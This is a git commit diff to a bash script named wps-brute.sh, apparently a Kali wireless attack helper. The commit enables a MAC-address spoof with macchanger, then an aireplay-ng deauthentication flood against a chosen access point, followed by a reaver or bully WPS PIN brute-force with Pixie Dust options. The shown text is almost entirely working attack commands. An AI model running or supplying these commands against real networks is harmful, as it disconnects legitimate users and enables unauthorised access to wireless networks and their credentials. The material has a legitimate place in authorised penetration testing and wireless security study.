7854bf1c540354b0b7c9d5cb1c129719e90c3879
Diveyez <nemofbaltimore@gmail.com>
2018-04-13 16:38:52 -0400

    Elite

--- Wireless-Testing/wps-brute.sh
+++ Wireless-Testing/wps-brute.sh
@@ -5,7 +5,7 @@
 # Further testing required
 # Written by Diveyez to make using other tools easy when setting up wireless networks.
 # Intended for use with stock kali-linux packages
-# apt update && apt install reaver bully airmon-ng aireplay-ng macchanger pixiewps
+apt update && apt install reaver bully airmon-ng aireplay-ng macchanger pixiewps
 # Scripting user input for target, channel, interface
 echo "You need an adapter in monitor mode to use this, airmon-ng start <interface> if you have not done that already!"
 sleep 1.5
@@ -32,14 +32,14 @@ do
           ifconfig $interface down
           macchanger -r $interface
           ifconfig $interface up
-          #aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1
+          aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1
           reaver -i $interface -b $tmac -c $channel -vv -K -JSL -p "";;
         "Bully")
             echo "Bully Attack Launching"
          ifconfig $interface down
          macchanger -r $interface
          ifconfig $interface up
-         #aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1
+         aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1
          bully $interface -b $tmac -e $bname -c$channel -dB -v 3 -p "" ;;
         "Quit")
             break
